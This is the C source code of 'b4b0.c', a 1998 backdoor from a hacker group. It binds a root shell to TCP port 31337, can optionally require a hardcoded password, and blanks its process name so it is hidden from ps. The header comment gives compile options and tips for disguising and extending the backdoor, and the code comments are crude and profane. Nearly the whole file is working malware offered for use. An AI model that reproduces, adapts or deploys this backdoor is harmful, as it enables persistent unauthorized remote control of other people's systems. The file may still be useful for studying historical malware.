/* b4b0.c - Ok so1o, listen carefully. This backdoor just binds a shell to
 *          the port of your choice on any given mashine. You can compile
 *          this to support password authentication or to just drop you into
 *          a root shell. Compile with -DPASSAUTH to suppost password auth. 
 *          "WHAT!??!?" you say so1o? No, you cant just use your traditional 
 *          cc teknEEq. Modify the line that says strcpy(argv[0], ""); to hold
 *          whatever you want the backdoor to apear as to ps. You can easily 
 *          modify this to run whatever you want on the server when connected
 *          to. 
 *          august something/98
 *          by r4lph m4lph.....
 *          gardener of the b4b0 drug fields in Bogota, Columbia.
*/

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <strings.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <signal.h>

#define PORT 31337  /* p0rt */
#define MSG "w3rD t0 d4 skrEEp7 k1dz\n"
#define SHELL "/bin/sh"
#ifdef PASSAUTH
#define PASSWD "fuQ_l4mB"  /* p4sswh0rd */
#endif
#define YES 1  /* y3z 3y3 fuQ l4mBz */
#define NO 0  /* n0 3y3 dEEd n0t fuQ m0n1qA */

int main(int argc, char *argv[]);

#ifdef PASSAUTH
int login(int EffDee);
#endif

int main(int argc, char *argv[])
{
   int sockfd, newfd, size;
   struct sockaddr_in local;
   struct sockaddr_in remote;
   
   strcpy(argv[0], "");
   signal(SIGCHLD, SIG_IGN); /* 1gn0re th3 d1e1ng fUq1ng k1dz */
   
   bzero(&local, sizeof(local));
   local.sin_family = AF_INET;
   local.sin_port = htons(PORT);
   local.sin_addr.s_addr = INADDR_ANY;
   bzero(&(local.sin_zero), 8);
   
   if((sockfd=socket(AF_INET, SOCK_STREAM, 0)) == -1)
     {
        perror("socket");
        exit(1);
     }
   if(bind(sockfd, (struct sockaddr *)&local, sizeof(struct sockaddr)) == -1)
     {
        perror("bind");
        exit(1);
     }
   if(listen(sockfd, 5) == -1)
     {
        perror("listen");
        exit(1);
     }
   size = sizeof(struct sockaddr_in);
   
   while(1)
     {
        if((newfd=accept(sockfd, (struct sockaddr *)&remote, &size)) == -1)
          {
             perror("accept");
             exit(1);
          }
 
        if(!fork())
          {
             send(newfd, MSG, sizeof(MSG), 0); /* s4y h1 t0 so1o */
             
             #ifdef PASSAUTH
             if(login(newfd) != 1)
               { 
                  send(newfd, "FUCK OFF\n", 9, 0); /* s4y bY3 t0 so1o */
                  close(newfd);
                  exit(1);
               }
             #endif
             
             close(0); close(1); close(2);
             dup2(newfd, 0); dup2(newfd, 1); dup2(newfd, 2);  
             execl(SHELL, SHELL, (char *)0); close(newfd); exit(0);
          }
        close(newfd);
     }
   
   return(0);
}

#ifdef PASSAUTH
int login(int EffDee)
{
   char u_passwd[15];
   int i;
   send(EffDee, "Password: ", 11, 0); /* l0g1n so1o */
   recv(EffDee, u_passwd, sizeof(u_passwd), 0);
   for(i=0;i<strlen(u_passwd);i++)
     {
        if(u_passwd[i] == '\n' || u_passwd[i] == '\r')
          u_passwd[i] = '\0';
     }
   if(strcmp(PASSWD, u_passwd) == 0)
     return(YES);  /* y3z 3y3 fuQ l4mBz */
   else
     return(NO);  /* n0 3y3 dEEd n0t fuQ m0n1qA */
}
#endif
